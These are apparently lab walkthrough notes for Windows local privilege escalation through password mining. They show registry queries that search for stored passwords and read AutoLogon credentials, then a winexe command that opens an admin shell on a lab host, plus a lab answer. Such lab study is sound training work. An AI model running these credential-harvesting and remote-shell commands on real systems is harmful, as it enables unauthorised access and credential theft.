[Windows Local Privilege Escalation - Password Mining (Registry) - YouTube](https://www.youtube.com/watch?v=2fF4Xre-w2g&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=10)


(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)

1. The registry can be searched for keys and values that contain the word "password":

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

2. If you want to save some time, query this specific key to find admin AutoLogon credentials:

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

3. On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

```
winexe -U 'admin%password' //10.10.181.132 cmd.exe
```
